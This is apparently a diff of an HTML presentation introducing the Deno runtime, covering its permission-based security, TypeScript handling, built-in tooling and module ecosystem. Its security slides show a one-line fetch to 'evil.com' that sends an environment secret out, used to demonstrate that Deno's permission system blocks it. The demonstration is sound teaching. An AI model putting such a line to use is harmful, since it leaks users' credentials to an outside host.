@@ -143,8 +143,8 @@ Deno's initial goal:
 
 - V8 is already a secure sandbox
 
-<span style="color: grey">// Luckily, JS in the browser can't
-// make syscalls...</span>
+<span style="color: grey">// Luckily, JavaScript in the browser
+// can't make syscalls...</span>
 </pre>
 
 <pre>
@@ -207,7 +207,7 @@ Deno's initial goal:
 <span style="color: lightgreen">> Tight security</span>
 
 
-<span style="color: grey">// in examples/not_evil.ts</span>
+<span style="color: grey">// in examples/definitely_not_evil.ts</span>
 
 <span style="color: orchid">await</span> <span style="color: khaki">fetch</span>(<span style="color: coral">`https://evil.com/</span><span style="color: dodgerblue">${</span> <span style="color: lightskyblue">Deno</span>.<span style="color: lightgreen">env</span>.<span style="color: khaki">get</span>(<span style="color: coral">"YOUR_SECRET"</span>) <span style="color: dodgerblue">}</span><span style="color: coral">`</span>);
 </pre>
@@ -218,7 +218,7 @@ Deno's initial goal:
 <span style="color: lightgreen">> Tight security</span>
 
 
-<span style="color: khaki">> deno run examples\not_evil.ts</span>
+<span style="color: khaki">> deno run examples/definitely_not_evil.ts</span>
 
 <span style="color: crimson">error: Uncaught PermissionDenied:</span> Requires env access
     to "YOUR_SECRET", run again with the --allow-env flag
@@ -227,7 +227,7 @@ Deno's initial goal:
                                           ^
     at Object.opSync (deno:core/01_core.js:149:12)
     at Object.getEnv [as get] (deno:runtime/js/30_os.js:63:17)
-    at file:///C:/dev/deno_intro/examples/not_evil.ts:1:43</span>
+    at file:///C:/dev/deno_intro/examples/definitely_not_evil.ts:1:43</span>
 </pre>
 
 <pre style="margin-top: -12.5vh;">
@@ -239,7 +239,7 @@ Deno's initial goal:
 <span style="color: khaki">> deno run
     <span style="color: orchid">--allow-env=YOUR_SECRET
     --allow-net=evil.com</span>
-        examples/not_evil.ts</span>
+        examples/definitely_not_evil.ts</span>
 
 // Granular permissions:
     <span style="color: grey">--allow-</span>env<span style="color: grey">:    Allow environment access
@@ -305,7 +305,7 @@ For example:
 
              | Chrome | Firefox | <span style="color: grey">...</span> | Deno |
 -------------|--------|---------|-----|------|
-localStorage | <span style="color: springgreen">4</span>      | <span style="color: springgreen">3.2</span>     | <span style="color: grey">...</span> | <span style="color: springgreen">1.16</span> |
+<span style="color: khaki">localStorage</span> | <span style="color: springgreen">4</span>      | <span style="color: springgreen">3.2</span>     | <span style="color: grey">...</span> | <span style="color: springgreen">1.16</span> |
 </pre>
 
 <pre style="margin-top: -12.5vh">
@@ -316,7 +316,7 @@ localStorage | <span style="color: springgreen">4</span>      | <span style="col
 
 - TypedArrays (e.g. `<span style="color: lightskyblue">Uint8Array</span>`) instead of Node's `<span style="color: lightskyblue">Buffer</span>`
 
-- APIs use <span style="color: orchid">asnyc/await</span>, for example:
+- I/O APIs use <span style="color: orchid">asnyc/await</span>, for example:
 
     <span style="color: lightgreen">readFile</span>(name: <span style="color: lightskyblue">string</span>): Promise&lt;<span style="color: lightskyblue">Uint8Array</span>>;
 
@@ -336,12 +336,34 @@ localStorage | <span style="color: springgreen">4</span>      | <span style="col
 <span style="color: dodgerblue"># Deep-Dive & Features</span>
 
 <span style="color: lightgreen">> TypeScript</span>
+
+
+<a href="https://www.youtube.com/watch?v=z6JRlx5NC9E">"I'm convinced that TypeScript is essentially 
+like the next version of JavaScript"</a> -- Ryan
+
+- By default, Deno will run with strict mode enabled.
+- You can use `<span style="color: khaki">tsconfig.json</span>` for different settings.
+- If the program has a type error, Deno will <u>not</u> run it.
+- You can use `<span style="color: khaki">--no-check</span>`, and `<span style="color: grey">// @ts-expect-error</span>`,
+  among others, to run it anyways. 
+- Must use explicit file extensions (e.g. `<span style="color: khaki">./mod.ts</span>`
+  instead of `<span style="color: khaki">./mod</span>`).
 </pre>
 
 <pre>
 <span style="color: dodgerblue"># Deep-Dive & Features</span>
 
 <span style="color: lightgreen">> Modern tooling</span>
+
+Deno provides useful tools as subcommands, e.g.:
+
+- `<span style="color: khaki">deno bundle`</span>:  Bundler
+- `<span style="color: khaki">deno compile`</span>: Compiling executables
+- `<span style="color: khaki">deno doc`</span>:     Documentation generator
+- `<span style="color: khaki">deno fmt`</span>:     Formatter
+- `<span style="color: khaki">deno lint`</span>:    Linter
+- `<span style="color: khaki">deno test`</span>:    Test runner
+- `<span style="color: khaki">deno vendor`</span>:  Vendoring dependencies
 </pre>
 
 <pre style="margin-top: -12.5vh;">
@@ -362,7 +384,7 @@ localStorage | <span style="color: springgreen">4</span>      | <span style="col
     <span style="color: grey">// Examples: <a href="https://deno.com/deploy">Deno Deploy</a>, <a href="https://denoflare.dev/">Denoflare</a></span>
 
 - Cross-platform CLI applications
-  - Bundle code into executable using <span style="color: khaki">`deno compile`</span>
+  - Create executable using <span style="color: khaki">`deno compile`</span>
   - Use <span style="color: lightskyblue">localStorage</span> for storing data
   - Use FFI for native functionality
 
@@ -371,6 +393,23 @@ localStorage | <span style="color: springgreen">4</span>      | <span style="col
 
 <pre>
 <span style="color: dodgerblue"># Ecosystem</span>
+
+- There is no centralized ecosystem
+  - Hard to judge size and quality of the ecosystem
+  - Since you can import from any URL, people do so
+    - Self-hosted modules are not uncommon
+  - Largest new registries are <a href="https://deno.land/x">deno.land/x</a> and <a href="https://nest.land/">nest.land</a>
+
+- Existing code for the web or Node can largely be reused
+  - CDNs like <a href="https://skypack.dev/">skypack.dev</a> and <a href="https://esm.sh/">esm.sh</a> provide optimized
+    NPM packages without install, e.g.:
+
+    <span style="color: orchid">import</span> { <span style="color: lightskyblue">Parser</span>, <span style="color: lightskyblue">HtmlRenderer</span> } <span style="color: orchid">from</span>
+        <span style="color: coral">"https://cdn.skypack.dev/commonmark@0.30.0?dts&min"</span>;
+
+  - `<span style="color: khaki">--compat</span>` flag enables an incomplete Node compat mode
+  - `<span style="color: khaki">std/node</span>` provides some polyfills (e.g. for creating
+    a `<span style="color: lightgreen">require</span>` function)
 </pre>
 
 <pre>
